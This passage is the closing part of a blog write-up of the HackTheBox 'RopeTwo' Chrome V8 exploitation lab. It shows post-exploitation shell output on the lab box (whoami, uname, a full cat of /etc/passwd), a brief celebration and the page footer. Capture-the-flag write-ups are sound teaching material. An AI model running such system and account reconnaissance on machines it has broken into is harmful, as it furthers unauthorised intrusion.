class="built_in">groups</span>=1001(chromeuser)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">chromeuser</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/chromeuser/web</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">chrome.tar.gz</span><br><span class="line">main.py</span><br><span class="line">output</span><br><span class="line">templates</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux rope2 5.0.0-38-generic <span class="comment">#41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:109::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">landscape:x:107:114::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:108:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin</span><br><span class="line">r4j:x:1000:1000:r4j:/home/r4j:/bin/bash</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">chromeuser:x:1001:1001:,,,:/home/chromeuser:/bin/bash</span><br><span class="line">ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">gitlab-www:x:997:997::/var/opt/gitlab/nginx:/bin/false</span><br><span class="line">git:x:996:996::/var/opt/gitlab:/bin/sh</span><br><span class="line">gitlab-redis:x:995:995::/var/opt/gitlab/redis:/bin/false</span><br><span class="line">gitlab-psql:x:994:994::/var/opt/gitlab/postgresql:/bin/sh</span><br><span class="line">gitlab-prometheus:x:993:993::/var/opt/gitlab/prometheus:/bin/sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb170.jpg"></li>
+</ul>
+<p>we finally success! amazing!</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/" title="HackTheBox-RopeTwo-[PWN-Chrome-V8引擎]">https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/18/tenet/" rel="prev" title="Hack-The-Box-walkthrough[Tenet]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Tenet]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/01/24/JIT-engines-exploitation/" rel="next" title="JavaScript-JIT引擎逻辑漏洞利用">
+                  JavaScript-JIT引擎逻辑漏洞利用 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
